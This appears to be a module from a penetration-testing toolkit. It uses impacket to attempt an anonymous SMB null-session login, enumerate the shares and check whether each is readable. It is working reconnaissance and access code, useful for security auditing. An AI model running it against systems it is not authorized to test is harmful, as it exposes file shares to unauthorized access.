"""SMB exploitation"""

from impacket import smbconnection

def exploit_smb_null_session(target, port=445):
    """
    Test for SMB null session
    Returns: Result dict or None
    """
    print(f"\n[*] Testing SMB null session on {target}:{port}")
    
    try:
        conn = smbconnection.SMBConnection(target, target)
        conn.login('', '')  # Null session
        
        print(f"    [+] Null session established!")
        
        # List shares
        shares = conn.listShares()
        
        print(f"    [+] Available shares:")
        share_list = []
        
        for share in shares:
            share_name = share['shi1_netname'][:-1]
            share_list.append(share_name)
            print(f"        - {share_name}")
            
            # Try to access share
            try:
                conn.listPath(share_name, '/*')
                print(f"          [+] Readable!")
            except:
                print(f"          [-] Access denied")
        
        return {
            'service': 'SMB',
            'port': port,
            'vulnerability': 'Null Session',
            'shares': share_list,
            'status': 'success'
        }
        
    except Exception as e:
        print(f"    [-] Null session not allowed")
        return None